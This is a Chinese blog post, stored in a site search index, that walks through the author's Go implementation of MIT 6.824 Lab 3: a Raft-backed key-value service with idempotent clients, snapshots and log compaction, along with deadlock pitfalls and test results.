<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[MIT6-824-lab3-kvservice]]></title>
    <url>%2F2019%2F06%2F21%2FMIT6-824-lab3-kvservice%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;在Lab2，我们完成了底层raft框架的建立，包括Leader选举、日志复制、状态持久化，在网络分区、不可靠网络等各种不稳定条件中保证多机环境下的日志一致性；并确保在节点宕机后，能从磁盘中读取持久化的日志重新执行，快速同步到集群中。Lab3A的任务，是在lab2的raft之上，多加一层收发指令的逻辑，构建kvservice层。kvservice分两部分，一部分是发起指令的client，另一部分是负责处理、同步和执行指令的server，server将收到的client指令作为新日志传递给底层raft，然后由raft同步日志并让对应的kvservice执行指令，实现简易的分布式键值数据库，保证在大多数不良环境下，多机数据库的内容保持一致。此外，随着日志的增加，持久化的数据也在不断扩张，规模较大的持久化数据将会使得日志宕机后恢复的过程较为漫长，拖慢节点回到集群的速度。Lab3B的任务，是实现论文中的快照系统，当日志增长到一定程度时，保存现阶段的数据库快照，并且截断底层raft的日志，当节点宕机后恢复时，首先加载快照，然后执行未执行的指令（一般会非常少），如此一来，节点能快速同步到集群的最新状态。 参考：WuYin博客我的实现 Lab3A——容错键值数据库的建立&emsp;&emsp;lab3A要求建立容错键值数据库，编写发起指令的client以及处理指令的server两部分代码，要求系统实现强一致性。所谓的强一致性是指，即便系统本身由多台机器组成，与外界交互时表现的仿佛是一台机器，屏蔽掉所有底层同步的细节，仅仅展露客户所需要的功能。用户不必在意系统如何在多台机器间达成一致，只需要将他们的指令发送给系统即可。实验要求在多个客户以不同次序发送多条指令的情况下，集群中各个server内部的日志都是相同的，并且客户所有的指令都仅仅执行一次，实现幂等性。下面是具体流程图，图片来自这里。 实验分析&emsp;&emsp;在真正开始写代码之前，首先需要分析实验需求，捋清交互逻辑，定义数据结构，设计函数功能，规划总体框架，想明白再去写，可以事半功倍。虽然一开始的想法会在实现过程中不断的微调、修整，但是在写代码前就对内容有一个整体的认识，编码效率会更高。下面分析一下我在写代码前的一些思考，虽然真正写的时候还是出现了很多意料之外的情况，但是总体框架确实是一开始就定好的，每个函数的功能在编写前也是心中有数，后续只是实现上的问题，虽然，这些问题非常折磨。 为了实现幂等性（也就是说每条指令只实现一次），我们需要给客户发送的每条信息编码，问题是，多个用户，如何编码？如何保证多个用户之间的信息编码不会冲突？ 答：一开始我的想法是全局统一编码，然而多个机器显然无法做到编码同步，所以这个想法瞬间就舍弃了。 第二个想法是，每个客户单独编号，每条消息都有一对标志（客户编号，信息编号），所以只要比较同一客户的信息编号，就能明白这条信息是否已经执行过。这个设计可行。 &emsp;&emsp;接着思考，我用一个map来保存每个客户对应的已执行指令编号，这个map是只有leader维护吗？还是所有server都要维护？考虑同一条指令可能会发送多次，且上一条指令还未指令时可能会发送多次，所以每个server都需要维护这个map，当底层raft交付指令时，以此判断某条指令是否已经执行过。 &emsp;&emsp;接下来的问题就是，如何保证每个客户的客户编号不相同？我在这里思考了很久。在多机不通信的环境下，很难百分之百确保生成全局唯一的编号，所以我一开始的想法是，当客户激活时，首先向server端注册自己，server端收到新用户注册时，会返回一个唯一的编号，这样就可以保证客户编号是唯一的。但是也带来了一些问题，如果用户发起注册后，server生成编号并回复的消息丢失，此时用户重新注册，然而server端已经将这个用户放到map里面了，这样一来在map中会沉积大量冗余无用的项，所以这里可以参考三次握手，在客户端注册后，发起第一条信息时，leader才将这条客户放到自己的map中。如果leader宕机怎么办？所以客户注册的消息必须像普通日志一样广播到整个集群，才能注册这个客户。其实感觉挺麻烦的。 &emsp;&emsp;最后，考虑到测试中仅仅只会生成几个client，这种情况下，调用client.go里随机生成64位整数的函数生成每个client的编号，是切实可行的。因为这时候出现冲突的概率非常之低，几乎可以忽略不计，而且方便。 server如何通知相应的put、append、get操作已经完成？ 答：维护一个map，key是该操作对应的编号，value是管道，通过管道传递指令执行成功/失败的消息。具体来说，当对应leader的server收到来自client的RPC调用时，将指令作为参数调用底层raft的start函数，该start函数会返回这条指令对应的编号index和处理这条指令的term。如此一来，当收到一条新消息时，以index为key值在map中插入新的管道，然后监听这个管道。server等待底层raft同步这条指令，当底层raft同步成功交付这条指令时，在管道中传递执行指令的term，RPC调用根据管道的输出来判断这次执行是否成功。注意执行指令的term，和申请指令时的term不一定相同。比如通过start申请指令时的term是1，index是3，而server收到执行index=3指令的term是5，此时无法保证index=3的指令就是在RPC中等待的指令。&emsp;&emsp;随之而来的还有一个问题，这个key=index,value=chan的map该由谁保管？毫无疑问，只有leader会执行信息，所以理论上来说，只有leader会保持这个map。但是，由于leader会宕机，所以会存在两个情况:第一，旧leader接收信息后变成follower；第二，新leader上位，但是之前RPC调用的管道在旧leader那里，新leader还没开始维护这个map。&emsp;&emsp;其实很好解决，首先在server的put、get函数中，用select给管道等待加一个超时操作，如果超时，返回失败；其次，管道中传递的是term，可以通过比对start时的term和管道中的term来判断本server是否已经变成follower，这里我的逻辑是如果遇到这样的情况，返回失败，因为无法确保index的指令是start时的指令，但是可以根据map[客户编号， 已执行消息编号]来判断这条命令是否已经执行；每个server执行一条指令后，会首先判断自己是否存在map[index, chan]，如果存在，往chan中塞入信息，如果不存在，就不塞信息，防止往空管道中塞入信息造成错误。此外，每个put、get函数返回前，会手动删除对应index的管道，避免管道累积占内存，虽然也占不了多少。 client&emsp;&emsp;client模拟发起操作的客户，将所需要执行的指令通过RPC调用发送给server，并等待指令执行的结果。 client的三种操作： put：(key, value)，在数据库中新建键值对，如果该键已存在键值对，则用新的键值对覆盖数据库中已经存在的旧键值对。 append：(key, value)，将value“添加”到数据库中key值所对应的value中。在lab3，value都是string型，所谓的添加就是字符串拼接。 get：(key， ),获取数据库中key值所对应的value返回给client。 client逻辑：&emsp;&emsp;client发起指令的逻辑非常简单，一个无限循环直到该指令发送成功为止。在循环内部是一次RPC调用，如果成功，直接返回；如果由于超时或者所联系的server对应raft不是Leader，则更换一个server继续发起指令。为了加快操作，当client联系到leader时，会记录leader的编号，下一次执行新命令时，直接联系leader，而不是从头开始遍历寻找leader。下面以get为例展示逻辑，put是一样的： 12345678910111213141516171819202122232425262728func (ck *Clerk) Get(key string) string &#123; // You will have to modify this function. ck.cmdIndex++ args := GetArgs&#123;key, ck.me, ck.cmdIndex&#125; leader := ck.leader raft.InfoKV.Printf("Client:%20v cmdIndex:%4d| Begin! Get:[%v] from server:%3d\n", ck.me, ck.cmdIndex, key, leader) for&#123; reply := GetReply&#123;&#125; ok := ck.servers[leader].Call("KVServer.Get", &amp;args, &amp;reply) if ok &amp;&amp; !reply.WrongLeader&#123; ck.leader = leader //收到回复信息 if reply.Value == ErrNoKey&#123; //kv DB暂时没有这个key //raft.InfoKV.Printf("Client:20v cmdIndex:%4d | Get Failed! No such key\n", ck.me, ck.cmdIndex) return "" &#125; raft.InfoKV.Printf("Client:%20v cmdIndex:%4d| Successful! Get:[%v] from server:%3d value:[%v]\n", ck.me, ck.cmdIndex, key, leader, reply.Value) return reply.Value &#125; //对面不是leader Or 没收到回复 leader = (leader + 1) % len(ck.servers) //raft.InfoKV.Printf("Client:%20v cmdIndex:%4d| Failed! Change server to %3d\n", ck.me, ck.cmdIndex, leader) &#125;&#125; server&emsp;&emsp;在分布式数据库中，存在有很多个server，每个server对应一个raft，上层server负责执行指令，下层raft负责同步指令，而对应Leader的server负责接收指令以及响应client的操作。 op数据结构为防止重复执行指令，以及监听哪一条指令执行成功，每一条经由server传递给raft的指令都需要以下几点信息： 操作：本条指令执行什么操作get、append或者put。 key：指令对应的键值。 value：指令对应的value值，对于get操作，这一条可以为空。 clerk：这是哪一个客户。 index：这是clerk的第几条命令。具体定义如下：12345678910111213141516171819202122232425262728293031type Op struct &#123; // Your definitions here. // Field names must start with capital letters, // otherwise RPC will break. Method string //Put or Append or Get Key string Value string Clerk int64 //哪个clerk发出的 Index int // 这个clerk的第几条命令&#125;``` ### kv新增数据结构为了监听指令是否完成，我们需要一个key=index，value=chan的map。此外，还需要一个key=client，value=index的记录每个客户执行了什么指令的map。此外，还需要键值数据库。对应定义如下： ```gotype KVServer struct &#123; mu sync.Mutex me int rf *raft.Raft applyCh chan raft.ApplyMsg maxraftstate int // snapshot if log grows this big // Your definitions here. clerkLog map[int64]int //记录每一个clerk已执行的命令编号 kvDB map[string]string //保存key value msgCh map[int]chan int //消息通知的管道 persister *raft.Persister&#125; 处理RPC调用逻辑：server端处理get、append操作的逻辑如下： 将RPC附带的参数如客户编号、客户指令编号、操作等填入op中，作为一条新指令。 将这条新指令传递给与server相关联的rf start函数。 根据start函数的返回结果，判断本server对应的raft是否是leader，若不是，返回失败参数。 若本server对应的rf是leader，创建相应index的管道，并设置超时时间，等待管道有信息或者时间超时。 如果时间超时，返回失败参数。 如果管道有输出，则将管道输出（执行命令的term）与申请命令时的term作比较，若相等返回成功参数，若不相等，返回失败参数。get操作如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859func (kv *KVServer) Get(args *GetArgs, reply *GetReply) &#123; // Your code here. op := Op&#123;"Get", args.Key, "", args.ClerkID, args.CmdIndex&#125; //raft.InfoKV.Printf("KVServer:%2d | receive RPC! Clerk:[%20v] index:[%4d]\n", kv.me, op.Clerk, op.Index) reply.Err = ErrNoKey reply.WrongLeader = true //在follower上可能会get到过期的内容，所以一定要去leader那里get。 //kv.mu.Lock() //if ind, ok := kv.clerkLog[args.ClerkID]; ok &amp;&amp; ind &gt;= args.CmdIndex&#123; // kv.mu.Unlock() // //该指令已经执行 // //就算不是follower,见到已经执行的请求，直接返回true // //raft.InfoKV.Printf("KVServer:%2d | Cmd has been finished: Method:[%s] clerk:[%v] index:[%4d]\n", kv.me, op.Method, op.Clerk, op.Index) // reply.Value = kv.kvDB[args.Key] // reply.WrongLeader = false // reply.Err = OK // return //&#125; //kv.mu.Unlock() //raft.InfoKV.Printf("KVServer:%2d | Begin Method:[%s] clerk:[%20v] index:[%4d]\n", kv.me, op.Method, op.Clerk, op.Index) index, term, isLeader := kv.rf.Start(op) if !isLeader&#123; //raft.InfoKV.Printf("KVServer:%2d | Sry, I am not leader\n", kv.me) return &#125; kv.mu.Lock() raft.InfoKV.Printf(("KVServer:%2d | leader msgIndex:%4d\n"), kv.me, index) //新建ch再放入msgCh的好处是，下面select直接用ch即可 //而不是直接等待kv.msgCh[index] ch := make(chan int) kv.msgCh[index] = ch kv.mu.Unlock() select&#123; case &lt;- time.After(WaitPeriod): //超时还没有提交，多半是废了 raft.InfoKV.Printf("KVServer:%2d |Get &#123;index:%4d term:%4d&#125; failed! Timeout!\n", kv.me, index, term) case msgTerm := &lt;- ch: if msgTerm == term &#123; //命令执行 kv.mu.Lock() raft.InfoKV.Printf("KVServer:%2d | Get &#123;index:%4d term:%4d&#125; OK!\n", kv.me, index, term) if val, ok := kv.kvDB[args.Key]; ok&#123; reply.Value = val reply.Err = OK &#125; kv.mu.Unlock() reply.WrongLeader = false &#125;else&#123; raft.InfoKV.Printf("KVServer:%2d |Get &#123;index:%4d term:%4d&#125; failed! Not leader any more!\n", kv.me, index, term) &#125; &#125; go func() &#123;kv.closeCh(index)&#125;() return&#125; append操作：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849func (kv *KVServer) PutAppend(args *PutAppendArgs, reply *PutAppendReply) &#123; // Your code here. op := Op&#123;args.Op, args.Key, args.Value, args.ClerkID, args.CmdIndex&#125; //raft.InfoKV.Printf("KVServer:%2d | receive RPC! Clerk:[%20v] index:[%4d]\n", kv.me, op.Clerk, op.Index) reply.Err = OK kv.mu.Lock() //follower收到已经执行的put append请求，直接返回 if ind, ok := kv.clerkLog[args.ClerkID]; ok &amp;&amp; ind &gt;= args.CmdIndex&#123; //该指令已经执行 kv.mu.Unlock() //raft.InfoKV.Printf("KVServer:%2d | Cmd has been finished: Method:[%s] clerk:[%v] index:[%4d]\n", kv.me, op.Method, op.Clerk, op.Index) reply.WrongLeader = false return &#125; kv.mu.Unlock() //raft.InfoKV.Printf("KVServer:%2d | Begin Method:[%s] clerk:[%20v] index:[%4d]\n", kv.me, op.Method, op.Clerk, op.Index) index, term, isLeader := kv.rf.Start(op) if !isLeader&#123; //raft.InfoKV.Printf("KVServer:%2d | Sry, I am not leader\n", kv.me) reply.WrongLeader = true return &#125; kv.mu.Lock() raft.InfoKV.Printf(("KVServer:%2d | leader msgIndex:%4d\n"), kv.me, index) ch := make(chan int) kv.msgCh[index] = ch kv.mu.Unlock() reply.WrongLeader = true select&#123; case &lt;- time.After(WaitPeriod): //超时还没有提交，多半是废了 raft.InfoKV.Printf("KVServer:%2d | Put &#123;index:%4d term:%4d&#125; Failed, timeout!\n", kv.me, index, term) case msgTerm := &lt;- ch: if msgTerm == term &#123; //命令执行，或者已经执行过了 raft.InfoKV.Printf("KVServer:%2d | Put &#123;index:%4d term:%4d&#125; OK!\n", kv.me, index, term) reply.WrongLeader = false &#125;else&#123; raft.InfoKV.Printf("KVServer:%2d | Put &#123;index:%4d term:%4d&#125; Failed, not leader!\n", kv.me, index, term) &#125; &#125; go func() &#123;kv.closeCh(index)&#125;() return&#125; &emsp;&emsp;可以注意到，在正式put操作之前有一个判断这个命令是否已经执行的操作，而get操作却没有。因为对于append操作而言，即便是follower收到这个rpc调用，但是一旦follower也执行了这个操作，那么leader也执行了这个操作，且这个操作不需要访问kvDB里的值，因此可以直接返回。而get必须要通过leader来处理，因为get需要获取数据库中的某个值返回，如果是follower执行get操作，那么将很有可能返回一个旧值。 管道回收逻辑&emsp;&emsp;为了防止管道太多占用内存，所以每个get和put操作完成后，都会关闭管道，并且从map中删除key=index这一项。123456func (kv *KVServer) closeCh(index int)&#123; kv.mu.Lock() defer kv.mu.Unlock() close(kv.msgCh[index]) delete(kv.msgCh, index)&#125; 主要逻辑&emsp;&emsp;接下来则是server的重中之重，当server通过传递给rf的applyCh中收到rf已经同步成功的指令时，开始执行这一条指令： 判断这条指令是否已经执行。 若未执行，判断是什么指令，执行之。 若是leader，给相应管道传递消息；若是follower，由于map中没有这一项，所以忽略。 1234567891011121314151617181920212223242526272829303132333435363738394041func (kv *KVServer) receiveNewMsg()&#123; for msg := range kv.applyCh &#123; kv.mu.Lock() //按序执行指令 index := msg.CommandIndex term := msg.CommitTerm op := msg.Command.(Op) if ind, ok := kv.clerkLog[op.Clerk]; ok &amp;&amp; ind &gt;= op.Index &#123; //如果clerk存在，并且该指令已经执行，啥也不做 //会不会出现index顺序为6 8 7的情况？ //不会，因为只有前一条指令成功执行,clerk才会发送后一条指令 //只会有重复指令，而不会出现跳跃指令 //raft.InfoKV.Printf("KVServer:%2d | Cmd has been finished: Method:[%s] clerk:[%v] Cindex:[%4d]\n", kv.me, op.Method, op.Clerk, op.Index) &#125;else&#123; //执行指令 kv.clerkLog[op.Clerk] = op.Index switch op.Method &#123; case "Put": kv.kvDB[op.Key] = op.Value case "Append": if _, ok := kv.kvDB[op.Key]; ok &#123; kv.kvDB[op.Key] = kv.kvDB[op.Key] + op.Value &#125; else &#123; kv.kvDB[op.Key] = op.Value &#125; case "Get": &#125; &#125; //只有leader才有管道，所以只有leader才会通知 //旧laeder通知时，term不一样，rpc调用失败 //新leader没有管道，但是已执行指令，下一次RPC到来时直接返回 if ch, ok := kv.msgCh[index]; ok&#123; ch &lt;- term &#125; kv.mu.Unlock() &#125;&#125; server初始化1234567891011121314151617181920212223242526func StartKVServer(servers []*labrpc.ClientEnd, me int, persister *raft.Persister, maxraftstate int) *KVServer &#123; // call labgob.Register on structures you want // Go's RPC library to marshall/unmarshall. labgob.Register(Op&#123;&#125;) kv := new(KVServer) kv.me = me kv.maxraftstate = maxraftstate // You may need initialization code here. kv.applyCh = make(chan raft.ApplyMsg) kv.rf = raft.Make(servers, me, persister, kv.applyCh) // You may need initialization code here. kv.kvDB = make(map[string]string) kv.clerkLog = make(map[int64]int) kv.msgCh = make(map[int]chan int) raft.InfoKV.Printf("KVServer:%2d | Create New KV server!\n", kv.me) go kv.receiveNewMsg() return kv&#125; 说明&emsp;&emsp;代码中出现的InfoKV是我自己定义的日志，忽略之，反正是某种输出日志的东西，自定义即可。 坑&emsp;&emsp;在实现时遇到了许多坑，给大家分享一下。 kv通过apply接收底层raft的信息引发的死锁：死锁不是仅仅是两个锁，还可能是管道和锁之间，或者管道和管道之间引起的！ 说明：在put函数里，先判断命令是否执行，而这个判断由于要访问clerkLogs，因此需要加锁。一开始我对底层raft的start函数调用也是包含在kv的锁里，因此引发了死锁。比如，当底层apply一次性提交很多个数据时，会一直占用rf.mu，server接收数据的逻辑时，接收一个数据=&gt;申请kv.mu=&gt;处理数据=&gt;释放锁=&gt;接收第二个数据，假设底层raft有10个数据要提交，当提交完第二个数据后，有新的get操作到来，获取了kv的mu的锁，由于start需要rf.mu，因此卡住，而server接收数据这边，由于一直未能获取kv.mu锁，因此也卡住，而底层raft由于不能通过管道提交数据，也卡住，因此不会释放rf.mu锁，因此引发了死锁。 第二个坑是个很有趣的问题，分享一下： 一开始我接受数据的逻辑是这么写的： 123456789For&#123; select &#123; case &lt;- exitch: return Case&lt;-applych //do something &#125;&#125; &amp;emsp;&amp;emsp;不用在意exitCh，本来是想像结束raft一样，当调用kv.Kill()函数时，通过这个管道结束这个goroutine。不过仔细一想，当底层raft“死”掉时，不再有数据交付，其实上层kv就和“死”掉差不多。另外其实可以在底层rf被kill掉时，往上层提交一个代表结束的指令，上层kv接收到这个指令就结束自己也是可以的。不过这不重要。 &amp;emsp;&amp;emsp;重要的的是，当我这么写的时候会出现这么一种情况：当命令交付并且执行完后，管道还没创建！ &amp;emsp;&amp;emsp;这种情况的出现是因为，在put函数start后，需要调用kv.mu来创建管道，但是有一种可能，底层raft一直在交付数据，直到新指令同步了仍然在交付数据，并且server接收指令的逻辑一直在运行，不断地获得kv.mu，使得put函数无法创建管道。因此当这条命令执行完交付时，命令对应的管道都还没有执行。其实在现在这个版本中，这不是问题，因为put会超时，返回失败参数，然后重新发送指令，然后第二次发送指令时会发现已经执行了。只是很偶尔，还是会出现管道还没创建的情况。 小结&emsp;&emsp;lab3A的挑战就是处理各种死锁问题，会遇到各种奇葩的死锁，以及在各种边界条件疯狂试探，必须考虑到所有可能发生的边界条件并加以预防，不要抱侥幸心理，觉得这不可能发生！多线程调度会带来各种问题，比如管道还没来得及创建，另一个线程就使用，完全是有可能的。&emsp;&emsp;另外，我没有通过race，因为我在各种地方疯狂打log，而我打log又需要用到kv.me等敏感变量，但其实去掉这些log之后就能通过race了。 效果1234567891011121314151617181920212223242526272829303132Test: one client (3A) ... ... Passed -- 15.5 5 2803 149Test: many clients (3A) ... ... Passed -- 16.7 5 3337 751Test: unreliable net, many clients (3A) ... ... Passed -- 17.1 5 2285 611Test: concurrent append to same key, unreliable (3A) ... ... Passed -- 1.8 3 150 52Test: progress in majority (3A) ... ... Passed -- 0.7 5 73 2Test: no progress in minority (3A) ... ... Passed -- 1.2 5 119 3Test: completion after heal (3A) ... ... Passed -- 1.0 5 50 3Test: partitions, one client (3A) ... ... Passed -- 22.7 5 3108 140Test: partitions, many clients (3A) ... ... Passed -- 23.6 5 4144 770Test: restarts, one client (3A) ... ... Passed -- 19.6 5 7492 150Test: restarts, many clients (3A) ... ... Passed -- 20.6 5 9143 750Test: unreliable net, restarts, many clients (3A) ... ... Passed -- 21.2 5 3300 622Test: restarts, partitions, many clients (3A) ... ... Passed -- 28.2 5 10452 735Test: unreliable net, restarts, partitions, many clients (3A) ... ... Passed -- 28.2 5 3131 329Test: unreliable net, restarts, partitions, many clients, linearizability checks (3A) ... ... Passed -- 25.3 7 9829 902PASSok kvraft 243.555s Lab3B——状态快照与日志压缩&emsp;&emsp;随着系统不断运行，底层raft保存的日志越来越多，这会带来三个问题： 每一次持久化数据的时间会越来越长，拖慢日志同步的时间，因为持久化数据时需要用到rf.mu锁。 当底层raft宕机后，通过持久化数据恢复的时间会非常漫长。 脱离集群很久的节点重新回到集群时，需要同步的日志会非常的多。因此，有必要定时对上层server的状态保存快照，压缩底层raft的日志，这样一来，不论是持久化数据的时间、恢复的时间，已经脱离集群很久节点的同步时间都会大大缩短，提高系统的性能。其逻辑流程图如下，图片来自这里 思考&emsp;&emsp;同样的，在写代码前，需要思考一下如何实现快照功能，以及设计相应的函数和数据结构。 首先，一个很重要的问题是，快照会截断raft的日志，进行此操作之后，日志编号不等于在raft中logs保存的编号，那么如何来获取日志编号和logs编号的对应关系？ 答：在这里，根据论文描述，新设立两个变量rf.lastIncludedIndex和rf.lastIncludedTerm，分别对应上一个快照最后一条指令的编号和任期。如此一来，日志编号=logs下标+rf.lastIncludedIndex，换句话说，日志就保存在rf.logs[日志编号-rf.lastIncludedIndex]中。 应该快照哪些内容？ 答：快照的功能是保存当前键值数据库的状态以方便未来恢复，所以对于server而言，必须要快照的是此时的键值数据库kvDB，其次，为了记录有什么指令已经执行过，map[客户编号，指令编号]同样需要快照保存。对于raft来说，在上层server快照的同时，会丢弃快照对应的指令，保存快照之后未执行的指令。所以在快照时，raft需要同步持久化数据，包括未执行的日志logs，指示快照对应的日志编号rf.lastIncludeIndex和lastIncludedTerm，同时还要保存raft当前的任期以及votedFor。有了这些参数，在上层server恢复快照时，底层raft能同步恢复到相应的状态。 快照的逻辑？ 答：kv在建立时会获得maxRaftState参数来控制底层raft日志的长度，快照具体逻辑如下：对于每一个server： 上层server在执行完一条指令，检测底层raft的持久化数据的长度。 如果持久化数据过长，上层server会保存当前clerkLogs和kvDB的快照，并将快照传递给底层rf。 底层rf收到上层server的快照，首先判断此快照操作是否最新。 如果是，调用自身的persister同时保存快照和当前的状态。 对于leader： Leader发现follower日志缺失或者日志不匹配，并且所需要的日志已经被快照时，切换AppendEntries为InstallSnapshot。 follower接收到来自leader的快照操作时，与自身快照对比，决定是否进行日志覆盖或者删除。 如果决定接收leader快照，follower将同时持久化此快照数据和自身状态。 follower发送快照信息给上层servre，重置上层server的键值数据库以达成一致。 执行快照的影响？ 答：上层server收到来自底层raft的快照数据后，重置自身键值数据库和[客户编号，指令编号]字典。 这里persis是覆盖式保存，也即是后面保存的快照和日志会覆盖之前保存的快照和日志，如果follower要求的日志在leader所保存的快照和日志之前，该怎么办？ 答：凡是follower所需要的日志已经被leader快照，leader直接发送自身快照过去，而不再是发送日志。这可以大大加快日志同步速度。如下图所示：图片来自这里&emsp;&emsp;可以看到，当follower日志缺失较多时，直接发送快照能加快离群节点的同步速度。只是这里有些取舍问题，发送快照真的比同步日志更快吗？一个快照包含整个键值数据库，而日志仅仅包含一些指令，如果键值数据库较大，发送快照不一定比同步日志更快吧。然而，当快照后leader就丢弃之前的日志，也无法同步日志了。所以，我觉得，实际应用中maxRaftState应该设置的大一点，快照不能太频繁，否则频繁发送快照对带宽占用率太大了；另一方面，快照也要定时进行，防止宕机后恢复的时间太长。 旧日志必须要以go可以回收的方式丢弃。也就是说，丢弃日志后，必须重新make新的切片来保存未执行的日志。 raft 持久化数据时新增两个变量，就是rf.LastIncludedIndex和rf.lastIncludeTerm，这两个变量仅仅在快照时会更改。当raft从持久化数据中恢复时，不仅要恢复这两个变量，还需要将rf.lastApplied和rf.commitIndex设置为rf.lastIncludedIndex。这一点一定要注意，因为引入快照后，最后执行的指令是rf.lastApplied。 关于下标或者编号的问题。在引入快照操作后，日志就对应两个编号，一个是真实编号，代表这条指令是整个集群执行的第几条指令，完全递增；第二个是下标编号，代表这条指令保存在rf.logs的第几位，我们必须明确，什么时候使用真实编号，又在什么情况下，使用下标编号。 答：毫无疑问，涉及到比较的，都是用真实编号，如rf.lastApplied, rf.commitIndex, prevLogIndex, nextIndex, matchIndex，这些都保存为真实编号，指示真正执行的指令编号。而当要访问指令时，则使用下标编号(rf.logs[真实编号-rf.lastIncludedIndex])，所以其实很明确了，在所有情况下，所有编号都使用真实编号来存储、比较、判别，只有当引用某条具体指令时，才利用其下标编号访问rf.logs。别看现在说的好像很简单，没有什么技巧的样子，当时我就在这里卡了很久，修改了很多地方才改对。 serverserver在启动时首先加载快照数据，然后循环进行日志长度检测、快照数据保存、给rf发送快照信号以及接收来自rf的快照。 加载快照数据在建立新的kv时，首先判断其peresist里有没有快照数据，如果有，则立刻恢复快照。1234567891011121314func StartKVServer(servers []*labrpc.ClientEnd, me int, persister *raft.Persister, maxraftstate int) *KVServer &#123; //其他变量的初始化 ... kv.persister = persister kv.loadSnapshot() raft.InfoKV.Printf("KVServer:%2d | Create New KV server!\n", kv.me) go kv.receiveNewMsg() return kv&#125; 1234567func (kv *KVServer) loadSnapshot()&#123; data := kv.persister.ReadSnapshot() if data == nil || len(data) == 0&#123; return &#125; kv.decodedSnapshot(data)&#125; 12345678910111213141516func (kv *KVServer) decodedSnapshot(data []byte)&#123; //调用此函数时，，默认调用者持有kv.mu r := bytes.NewBuffer(data) dec := labgob.NewDecoder(r) var db map[string]string var cl map[int64]int if dec.Decode(&amp;db) != nil || dec.Decode(&amp;cl) != nil&#123; raft.InfoKV.Printf("KVServer:%2d | KV Failed to recover by snapshot!\n", kv.me) &#125;else&#123; kv.kvDB = db kv.clerkLog = cl raft.InfoKV.Printf("KVServer:%2d | KV recover frome snapshot successful! \n", kv.me) &#125;&#125; 恢复快照数据当底层rf交付的消息的commandValid为false时，表明kv需要从交付的数据中读取快照并重置键值数据库。如果觉得commandValid变量名不太贴切的，可以自己修改一下。1234567891011121314151617181920func (kv *KVServer) receiveNewMsg()&#123; for msg := range kv.applyCh &#123; kv.mu.Lock() //按序执行指令 index := msg.CommandIndex term := msg.CommitTerm //role := msg.Role if !msg.CommandValid&#123; //snapshot op := msg.Command.([]byte) kv.decodedSnapshot(op) kv.mu.Unlock() continue &#125; //正常执行指令 ... &#125;&#125; 检测日志长度在执行完一条指令后，检测此时快照数据是否超过maxRaftState。要注意，这里需要在执行完一条指令后检查状态，而不是在执行指令之前。因为我的代码逻辑中，快照所对应的最后一条指令，就是执行检测时的指令编号index，也就是说，快照等于index及之前的所有指令执行的结果。123456789101112131415func (kv *KVServer) receiveNewMsg()&#123; for msg := range kv.applyCh &#123; kv.mu.Lock() ... //按序执行指令 //要放在指令执行之后才检查状态 //因为index是所保存快照最后一条执行的指令 //如果放在index指令执行前检测，那么保存的快照将不包含index这条指令 kv.checkState(index, term) kv.mu.Unlock() &#125;&#125; 快照数据保存12345678910111213141516171819202122232425func (kv *KVServer) checkState(index int, term int)&#123; //判断raft日志长度 if kv.maxraftstate == -1&#123; return &#125; //日志长度接近时，启动快照 //因为rf连续提交日志后才会释放rf.mu，所以需要提前发出快照调用 portion := 2 / 3 //一个log的字节长度不是1，而可能是几十字节，所以可能仅仅几十个命令的raftStateSize就超过1000了。 //几个log的字节大小可能就几百字节了，所以快照要趁早 if kv.persister.RaftStateSize() &lt; kv.maxraftstate * portion&#123; return &#125; //因为takeSnapshot需要rf.mu //所以使用goroutine防止rf.mu阻塞 //下面这个会报错 //goroutine还没执行，本函数返回，然后取新的命令，执行命令修改kvDB //但同时！下面的goroutine执行了，而且执行时不需要拿kv.mu锁 //因此造成了在encodeSnapshot里读，在主goroutine里写，两种情况同时发生。 //go func() &#123;kv.rf.TakeSnapshot(kv.encodeSnapshot(), index, term)&#125;() rawSnapshot := kv.encodeSnapshot() go func() &#123;kv.rf.TakeSnapshot(rawSnapshot, index, term)&#125;()&#125; 123456789func (kv *KVServer) encodeSnapshot() []byte &#123; //调用者默认拥有kv.mu w := new(bytes.Buffer) enc := labgob.NewEncoder(w) enc.Encode(kv.kvDB) enc.Encode(kv.clerkLog) data := w.Bytes() return data&#125; &emsp;&emsp;注释里是一个很有意思的坑，由于快照需要底层rf.mu锁，而很可能现在rf在连续apply数据一直持有rf.mu锁，因此使用goroutine来调用底层rf保存快照的方法。然而这里编码的函数encodeSnapshot并没有申请kv.mu，因为一开始我默认调用此函数时拥有kv.mu。所以就出现问题了。goroutine的执行顺序是不确定的，所以可能在执行第二条指令，在修改kvDB时，才并发执行这个goroutine，而这个goroutine需要编码数据，需要访问kvDB,因为造成并发同时读和写同一个map，引发错误，猝不及防。修改方法很简单，先生成快照数据再调用底层rf的方法即可。 raft底层raft负责接收来自上层server的快照通知，leader负责同步快照给落后节点，follower在接收到来自leader的快照时，将快照传递给上层server重置数据库。 raft收到server快照通知raft收到来自server的快照通知时，会做如下操作： 判断此快照是否是最新。 如果是，截断日志，并将未执行日志放到新建的切片中。 保存快照以及持久化相关变量。 123456789101112131415161718192021func (rf *Raft) TakeSnapshot(rawSnapshot []byte, appliedId int, term int)&#123; //data kv需要快照的数据，index，快照对应的日志下标，term，下标所属term rf.mu.Lock() defer rf.mu.Unlock() InfoKV.Printf("Raft:%2d term:%3d | Begin snapshot! appliedId:%4d term:%4d lastIncludeIndex:%4d\n", rf.me, rf.currentTerm, appliedId, term, rf.lastIncludedIndex) if appliedId &lt;= rf.lastIncludedIndex&#123; //忽略发起的旧快照 //在一次apply中，由于rf.mu的缘故，会并发发起多个快照操作 return &#125; logs := make([]Entries, 0) //此时logs[0]是快照对应的最后一个日志，是一个占位符。 logs = append(logs, rf.logs[rf.subIdx(appliedId):]...) rf.logs = logs rf.lastIncludedTerm = term rf.lastIncludedIndex = appliedId rf.persistStateAndSnapshot(rawSnapshot)&#125; 1234567891011func (rf *Raft) persistStateAndSnapshot(snapshot []byte)&#123; w := new(bytes.Buffer) enc := labgob.NewEncoder(w) enc.Encode(rf.currentTerm) enc.Encode(rf.votedFor) enc.Encode(rf.logs) enc.Encode(rf.lastIncludedIndex) enc.Encode(rf.lastIncludedTerm) raftState := w.Bytes() rf.persister.SaveStateAndSnapshot(raftState, snapshot)&#125; 